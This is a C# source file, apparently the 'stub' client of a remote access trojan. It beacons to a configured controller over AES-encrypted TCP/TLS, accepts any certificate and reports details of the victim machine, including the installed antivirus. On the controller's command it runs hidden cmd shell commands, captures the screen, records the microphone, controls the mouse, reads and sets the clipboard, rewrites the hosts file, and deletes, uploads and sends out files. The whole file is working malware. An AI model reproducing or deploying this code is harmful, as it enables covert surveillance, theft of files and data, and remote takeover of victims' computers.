using System;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using System.Management;
using System.Text;
using System.Net.NetworkInformation;
using Microsoft.VisualBasic.Devices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Collections.Generic;
using common;

namespace stub
{
    class Main
    {
        [DllImport("user32", EntryPoint = "SetCursorPos", ExactSpelling = true, CharSet = System.Runtime.InteropServices.CharSet.Ansi, SetLastError = true)]
        private static extern int SetCursorPos(int X, int Y);

        [DllImport("user32", EntryPoint = "mouse_event", ExactSpelling = true, CharSet = System.Runtime.InteropServices.CharSet.Ansi, SetLastError = true)]
        public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        [DllImport("winmm.dll")]
        static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

        [DllImport("avicap32.dll")]
        static extern bool capGetDriverDescriptionA(short wDriverIndex, byte[] lpszName, int cbName, byte[] lpszVer, int cbVer);

        private const int MOUSEEVENTF_LEFTDOWN = 0x2;
        private const int MOUSEEVENTF_LEFTUP = 0x4;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x8;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;

        private ComputerInfo Info = new ComputerInfo();

        private string address = null;
        private string time = null;
        private string key = null;
        private Stream stream = null;
        private System.Threading.Timer tick = null;

        public Main(string address, string key, string time)
        {
            this.address = address;
            this.key = key;
            this.time = time;
        }

        public static bool ValidateServerCertificate(
      object sender,
      X509Certificate certificate,
      X509Chain chain,
      SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        private string GetAllLocalIPv4()
        {
            List<string> ipAddrList = new List<string>();
            foreach (NetworkInterface item in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (item.NetworkInterfaceType == NetworkInterfaceType.Ethernet && item.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (UnicastIPAddressInformation ip in item.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            ipAddrList.Add(ip.Address.ToString());
                        }
                    }
                }
            }
            return string.Join(",", ipAddrList.ToArray());
        }

        private void PingServer(object obj)
        {
            Send("PingServer");
        }

        private byte[] FullRead(int length)
        {
            try
            {
                byte[] buf = new byte[8096];
                int bytesLeft = length, read = 0;
                using (MemoryStream ms = new MemoryStream())
                {
                    while (bytesLeft > 0)
                    {
                        if (bytesLeft < buf.Length)
                            read = stream.Read(buf, 0, bytesLeft);
                        else
                            read = stream.Read(buf, 0, buf.Length);
                        if (read == 0)
                            break;
                        ms.Write(buf, 0, read);
                        bytesLeft -= read;
                    }

                    if (ms.Length > 0)
                        return ms.ToArray();
                    else
                        return null;
                }
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        public void Connect()
        {
            string[] temps = address.Split(':');
            if (temps.Length == 2)
            {
                string host = temps[0];
                bool ssl = temps[1].EndsWith("s");
                int port = int.Parse(temps[1].Replace("s", ""));
                int sleep = int.Parse(time);

                while (true)
                {
                    Thread.Sleep(sleep + new Random().Next(60 * 1000, 120 * 1000));

                    try
                    {
                        TcpClient client = new TcpClient(host, port);

                        if (ssl)
                        {
                            SslStream sslStream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null);
                            sslStream.AuthenticateAsClient(host, null, System.Security.Authentication.SslProtocols.Tls, false);
                            stream = sslStream;
                        }
                        else
                        {
                            stream = client.GetStream();
                        }

                        Send("NewConnection|" + GetAllLocalIPv4() + "|" + SystemInformation.UserName.ToString() + "|" + SystemInformation.ComputerName.ToString() + "|" + System.Environment.OSVersion.ToString());

                        if (tick == null)
                            tick = new System.Threading.Timer(PingServer, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));

                        while (true)
                        {
                            byte[] buf = FullRead(4);
                            if (buf == null)
                                break;

                            int length = BitConverter.ToInt32(buf, 0);
                            if (length <= 0 || length > 102400000)
                                break;

                            buf = FullRead(length);
                            if (buf == null)
                                break;

                            parse(aes.AES_Decrypt(buf, key));
                        }
                    }
                    catch (Exception ex)
                    {
                        //Console.WriteLine(ex.Message);
                    }
                }
            }
        }

        private void Send(string message)
        {
            try
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    byte[] buf = aes.AES_Encrypt(message, key);
                    ms.Write(BitConverter.GetBytes(buf.Length), 0, 4);
                    ms.Write(buf, 0, buf.Length);

                    stream.Write(ms.ToArray(), 0, (int)ms.Length);
                }
            }
            catch (Exception ex)
            {

            }
        }

        private void parse(string msg)
        {
            try
            {
                if (msg == "Disconnected")
                {
                    stream.Close();
                }
                else if (msg == "SystemInformation")
                {
                    Send("SystemInformation|" + getsystem() + GetDeepInfo());
                }
                else if (msg == "Software")
                {
                    getinstalledsoftware();
                }
                else if (msg.StartsWith("RD"))
                {
                    sendscreen(msg.Split('|')[2], Convert.ToInt32(msg.Split('|')[1]));
                    Thread.Sleep(100);
                }
                else if (msg == "GetPcBounds")
                {
                    Send("PCBounds" + System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height.ToString() + "x" + System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width.ToString());
                }
                else if (msg.Contains("SetCurPos"))
                {
                    MouseMov(msg);
                }
                else if (msg == "GetHostsFile")
                {
                    loadhostsfile();
                }
                else if (msg.StartsWith("SaveHostsFile"))
                {
                    savehostsfile(msg.Replace("SaveHostsFile", ""));
                }
                else if (msg == "GetCPText")
                {
                    getclipboardtext();
                }
                else if (msg.StartsWith("SaveCPText"))
                {
                    setclipboardtext(msg.Replace("SaveCPText", ""));
                }
                else if (msg.StartsWith("Shell"))
                {
                    runshell(msg.Replace("Shell", ""));
                }
                else if (msg == "RecordingStart")
                {
                    audio_start();
                }
                else if (msg == "RecordingStop")
                {
                    audio_stop();
                }
                else if (msg == "RecordingDownload")
                {
                    audio_get();
                }
                else if (msg == "ListDrives")
                {
                    listdrives();
                }
                else if (msg.StartsWith("ListFiles"))
                {
                    showfiles(msg.Replace("ListFiles", ""));
                }
                else if (msg.Contains("mkdir"))
                {
                    createnewdirectory(msg.Replace("mkdir", ""));
                }
                else if (msg.Contains("rmdir"))
                {
                    deletedirectory(msg.Replace("rmdir", ""));
                }
                else if (msg.Contains("rnfolder"))
                {
                    renamedirectory(msg.Replace("rnfolder", "").Split('|')[0], msg.Replace("rnfolder", "").Split('|')[1]);
                }
                else if (msg.Contains("mvdir"))
                {
                    movedirectory(msg.Replace("mvdir", "").Split('|')[0], msg.Replace("mvdir", "").Split('|')[1], msg.Replace("mvdir", "").Split('|')[2]);
                }
                else if (msg.Contains("rmfile"))
                {
                    deletefile(msg.Replace("rmfile", "").Split('|')[0]);
                }
                else if (msg.Contains("rnfile"))
                {
                    renamefile(msg.Replace("rnfile", "").Split('|')[0], msg.Replace("rnfile", "").Split('|')[1]);
                }
                else if (msg.StartsWith("sharefile"))
                {
                    sharefile(msg.Replace("sharefile", ""));
                }
                else if (msg.StartsWith("FileUpload"))
                {
                    UploadFile(msg.Replace("FileUpload", ""));
                }
            }
            catch (Exception ex)
            {
            }
        }

        private void UploadFile(string txt)
        {
            try
            {
                System.IO.File.WriteAllBytes(txt.Split('|')[0], Convert.FromBase64String(txt.Replace(txt.Split('|')[0] + "|", "")));
            }
            catch (Exception ex)
            {
            }
        }

        private void getinstalledsoftware()
        {
            try
            {

                Microsoft.Win32.RegistryKey regkey = null;
                Microsoft.Win32.RegistryKey subkey = null;
                string value = null;
                string regpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
                string software = string.Empty;

                regkey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(regpath);
                string[] subkeys = regkey.GetSubKeyNames();
                foreach (string subk in subkeys)
                {
                    subkey = regkey.OpenSubKey(subk);
                    value = Convert.ToString(subkey.GetValue("DisplayName", ""));
                    if (!string.IsNullOrEmpty(value))
                    {
                        if (value.IndexOf("Hotfix") != -1 || value.IndexOf("Security Update") != -1 || value.IndexOf("Update for") != -1)
                        { }
                        else
                            software += value + "|";
                    }
                }

                string final = "InstalledSoftware" + software;
                Send(final);
            }
            catch
            {
            }
        }

        private string getsystem()
        {
            try
            {
                return SystemInformation.ComputerName.ToString() + "|" + SystemInformation.UserName.ToString() + "|" +
                    SystemInformation.VirtualScreen.Width + "|" + SystemInformation.VirtualScreen.Height + "|" +
                    string.Format("{0:N2}", Info.AvailablePhysicalMemory / 1024 / 1024 / 1024) + " GB|" +
                    string.Format("{0:N2}", Info.AvailableVirtualMemory / 1024 / 1024 / 1024) + " GB|" +
                    Info.OSFullName + "|" + System.Environment.OSVersion.Platform.ToString() + "|" +
                    System.Environment.OSVersion.Version.ToString() + "|" + string.Format("{0:N2}", Info.TotalPhysicalMemory / 1024 / 1024 / 1024) + " GB|" +
                    string.Format("{0:N2}", Info.TotalVirtualMemory / 1024 / 1024 / 1024) + " GB|" + SystemInformation.PowerStatus.BatteryChargeStatus.ToString() + "|" +
                    SystemInformation.PowerStatus.BatteryFullLifetime.ToString() + "|" + SystemInformation.PowerStatus.BatteryLifePercent.ToString() + "|" +
                    SystemInformation.PowerStatus.BatteryLifeRemaining.ToString() + "|" + GetCPUInfo() + "|" + GetGPUName() + "|" +
                    "(Started: " + StartUp() + ") & (Uptime: " + getUptime() + ")";
            }
            catch
            {
                return "N/A";
            }
        }

        private string StartUp()
        {
            try
            {
                DateTime StartDate = default(DateTime);
                long envTicks = Environment.TickCount;
                long msToAdd = envTicks - (envTicks * 2);
                StartDate = DateTime.Now.AddMilliseconds(msToAdd);
                return StartDate.ToString();
            }
            catch
            {
                return null;
            }
        }

        private string getUptime()
        {
            try
            {
                string time = string.Empty;
                time += Math.Round(Environment.TickCount / 86400000.0) + " days, ";
                time += Math.Round(Environment.TickCount / (double)3600000 % 24) + " hours, ";
                time += Math.Round(Environment.TickCount / (double)120000 % 60) + " minutes, ";
                time += Math.Round(Environment.TickCount / (double)1000 % 60) + " seconds.";
                return time;
            }
            catch
            {
                return null;
            }
        }

        private string GetCPUInfo()
        {
            try
            {
                string cpuName = Convert.ToString(Microsoft.Win32.Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0").GetValue("ProcessorNameString"));
                return cpuName.Replace("         ", " ").Replace("  ", " ");
            }
            catch
            {
                return null;
            }
        }

        private string GetGPUName()
        {
            string GraphicsCardName = string.Empty;
            try
            {
                ManagementObjectSearcher WmiSelect = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (ManagementObject WmiResults in WmiSelect.Get())
                {
                    GraphicsCardName = WmiResults.GetPropertyValue("Name").ToString();
                    if (!string.IsNullOrEmpty(GraphicsCardName))
                    {
                        break;
                    }
                }
            }
            catch (ManagementException err)
            {
            }
            return GraphicsCardName;
        }

        private string GetDeepInfo()
        {
            try
            {
                string devices = string.Empty;

                byte[] lpszName = new byte[100];
                byte[] lpszVer = new byte[100];
                bool bReturn = false;
                for (int x = 0; x < 10; x++)
                {
                    bReturn = capGetDriverDescriptionA((short)x, lpszName, 100, lpszVer, 100);
                    if (bReturn)
                        devices += Encoding.ASCII.GetString(lpszName) + "|";
                }

                string res = string.Empty;
                if (!string.IsNullOrEmpty(devices))
                    res = "Yes";
                else
                    res = "No";

                return "|" + Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOwner", "N/A").ToString() + "|"
                    + Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOrganization", "N/A").ToString() + "|"
                    + "|" + NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString() + "|" + res + "|" + GetAV() + "|" + Application.ExecutablePath;
            }
            catch
            {
                return "";
            }
        }

        private string GetAV()
        {
            string computer = Environment.MachineName;
            string wmipath = @"\\" + computer + @"\root\SecurityCenter2";
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipath, "SELECT * FROM AntivirusProduct");
                ManagementObjectCollection instances = searcher.Get();
                foreach (ManagementObject queryObj in instances)
                    return queryObj["displayName"].ToString();
            }
            catch (Exception e)
            {

            }
            return "";
        }

        private void sendscreen(string res, int v)
        {
            try
            {
                int width = Convert.ToInt32(res.Split('x')[0]);
                int height = Convert.ToInt32(res.Split('x')[1]);

                using (Bitmap b = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(b))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, b.Size);
                        using (Image tmp = b.GetThumbnailImage(width, height, null, System.IntPtr.Zero))
                        {
                            using (Bitmap thumBitmap = new Bitmap(tmp))
                            {
                                ImageCodecInfo jgpEncoder = GetEncoder(System.Drawing.Imaging.ImageFormat.Jpeg);
                                EncoderParameters myEncoderParameters = new System.Drawing.Imaging.EncoderParameters(1);
                                EncoderParameter myEncoderParameter = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, v);
                                myEncoderParameters.Param[0] = myEncoderParameter;

                                using (MemoryStream ms = new MemoryStream())
                                {
                                    thumBitmap.Save(ms, jgpEncoder, myEncoderParameters);
                                    Send("RemoteDesktop" + Convert.ToBase64String(ms.ToArray()));
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
            }
        }

        private ImageCodecInfo GetEncoder(System.Drawing.Imaging.ImageFormat format)
        {
            try
            {
                System.Drawing.Imaging.ImageCodecInfo[] codecs = System.Drawing.Imaging.ImageCodecInfo.GetImageDecoders();
                //INSTANT C# NOTE: Commented this declaration since looping variables in 'foreach' loops are declared in the 'foreach' header in C#:
                //					Dim codec As System.Drawing.Imaging.ImageCodecInfo
                foreach (System.Drawing.Imaging.ImageCodecInfo codec in codecs)
                {
                    if (codec.FormatID == format.Guid)
                    {
                        return codec;
                    }
                }
                return null;
            }
            catch
            {
                return null;
            }
        }

        private void MouseMov(string txt)
        {
            try
            {
                if (txt.StartsWith("Left"))
                {
                    int x = Convert.ToInt32(txt.Replace("LeftSetCurPos", "").Split('x')[0]);
                    int y = Convert.ToInt32(txt.Replace("LeftSetCurPos", "").Split('x')[1]);

                    SetCursorPos(x, y);
                    mouse_event(Convert.ToInt32(MOUSEEVENTF_LEFTDOWN), 0, 0, 0, 0);
                    mouse_event(Convert.ToInt32(MOUSEEVENTF_LEFTUP), 0, 0, 0, 0);
                }
                else if (txt.StartsWith("Right"))
                {
                    int x = Convert.ToInt32(txt.Replace("RightSetCurPos", "").Split('x')[0]);
                    int y = Convert.ToInt32(txt.Replace("RightSetCurPos", "").Split('x')[1]);

                    SetCursorPos(x, y);
                    mouse_event(Convert.ToInt32(MOUSEEVENTF_RIGHTDOWN), 0, 0, 0, 0);
                    mouse_event(Convert.ToInt32(MOUSEEVENTF_RIGHTUP), 0, 0, 0, 0);
                }
            }
            catch
            {
            }
        }

        private void audio_start()
        {
            try
            {
                int i = mciSendString("open new type waveaudio alias capture", null, 0, (System.IntPtr)0);
                i = mciSendString("record capture", null, 0, (System.IntPtr)0);
            }
            catch
            {
            }
        }

        private void audio_stop()
        {
            try
            {
                int i = mciSendString("save capture " + System.IO.Path.GetTempPath().ToString() + "\\rec.wav", null, 0, (System.IntPtr)0);
                i = mciSendString("close capture", null, 0, (System.IntPtr)0);
            }
            catch
            {
            }
        }

        private void audio_get()
        {
            try
            {
                Send("RecordingFile" + SystemInformation.ComputerName + "|" + Convert.ToBase64String(File.ReadAllBytes(System.IO.Path.GetTempPath() + "\\rec.wav")));
                File.Delete(System.IO.Path.GetTempPath() + "\\rec.wav");
            }
            catch
            {
            }
        }

        private void loadhostsfile()
        {
            try
            {
                Send("HostsFile" + System.IO.File.ReadAllText("C:\\Windows\\system32\\drivers\\etc\\hosts"));
            }
            catch
            {
            }
        }

        private void savehostsfile(string txt)
        {
            try
            {
                System.IO.File.WriteAllText("C:\\Windows\\system32\\drivers\\etc\\hosts", txt);
            }
            catch
            {
            }
        }

        private void getclipboardtext()
        {
            try
            {
                Thread staThread = new Thread(() =>
                {
                    Send("CPText" + Clipboard.GetText());
                });
                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
            }
            catch (Exception ex)
            {

            }
        }

        private void setclipboardtext(string text)
        {
            try
            {
                Thread staThread = new Thread(() =>
                {
                    Clipboard.SetText(text);
                });
                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
            }
            catch (Exception ex)
            {

            }
        }

        private void runshell(string cmd)
        {
            try
            {
                System.Diagnostics.Process p = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo i = new System.Diagnostics.ProcessStartInfo("cmd");
                i.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                i.Arguments = "/C " + cmd;
                i.RedirectStandardOutput = true;
                i.UseShellExecute = false;
                i.CreateNoWindow = true;
                i.ErrorDialog = false;
                p.StartInfo = i;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();

                Send("Shell" + output);
            }
            catch
            {
            }
        }

        private void listdrives()
        {
            try
            {
                string drives = string.Empty;
                foreach (System.IO.DriveInfo drive in System.IO.DriveInfo.GetDrives())
                    drives += drive.Name + "|";
                Send("Drives" + drives);
            }
            catch (Exception ex)
            {

            }
        }

        private void showfiles(string path)
        {
            try
            {
                ListView listviewfiles = new ListView();
                foreach (string Dir in Directory.GetDirectories(path))
                {
                    DirectoryInfo d = new DirectoryInfo(Dir);
                    ListViewItem tempVar = listviewfiles.Items.Add(d.Name);
                    tempVar.SubItems.Add(d.CreationTime.ToString());
                    tempVar.SubItems.Add(d.LastAccessTime.ToString());
                    tempVar.SubItems.Add("");
                    tempVar.SubItems.Add("1");
                }

                foreach (string file in Directory.GetFiles(path))
                {
                    FileInfo f = new FileInfo(file);
                    ListViewItem tempVar = listviewfiles.Items.Add(f.Name);
                    tempVar.SubItems.Add(f.CreationTime.ToString());
                    tempVar.SubItems.Add(f.LastAccessTime.ToString());
                    tempVar.SubItems.Add(((f.Length / 1024.0)).ToString("###,###,##0.00") + " KB");
                    tempVar.SubItems.Add("0");
                }

                string Items = "";
                foreach (ListViewItem item in listviewfiles.Items)
                {
                    Items = Items + item.Text + "|" + item.SubItems[1].Text + "|" + item.SubItems[2].Text + "|" + item.SubItems[3].Text + "|" + item.SubItems[4].Text + Environment.NewLine;
                }
                Items = Items.Trim();

                Send("FileManagerFiles" + Items);
            }
            catch (Exception ex)
            {
            }
        }

        private void createnewdirectory(string path)
        {
            try
            {
                System.IO.Directory.CreateDirectory(path);
            }
            catch
            {
            }
        }

        private void deletedirectory(string path)
        {
            try
            {
                System.IO.Directory.Delete(path, true);
            }
            catch
            {
            }
        }

        private void renamedirectory(string path, string newname)
        {
            try
            {
                Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(path, newname);
            }
            catch
            {
            }
        }

        private void movedirectory(string oldpath, string newpath, string name)
        {
            try
            {
                Microsoft.VisualBasic.FileIO.FileSystem.MoveDirectory(oldpath, newpath + name, true);
            }
            catch
            {
            }
        }

        private void deletefile(string path)
        {
            try
            {
                Microsoft.VisualBasic.FileIO.FileSystem.DeleteFile(path, Microsoft.VisualBasic.FileIO.UIOption.OnlyErrorDialogs, Microsoft.VisualBasic.FileIO.RecycleOption.DeletePermanently);
            }
            catch
            {
            }
        }

        private void renamefile(string path, string newname)
        {
            try
            {
                Microsoft.VisualBasic.FileIO.FileSystem.RenameFile(path, newname);
            }
            catch
            {
            }
        }

        private void sharefile(string filepath)
        {
            string file = Convert.ToBase64String(System.IO.File.ReadAllBytes(filepath));
            Send("IncomingFile" + file);
        }
    }
}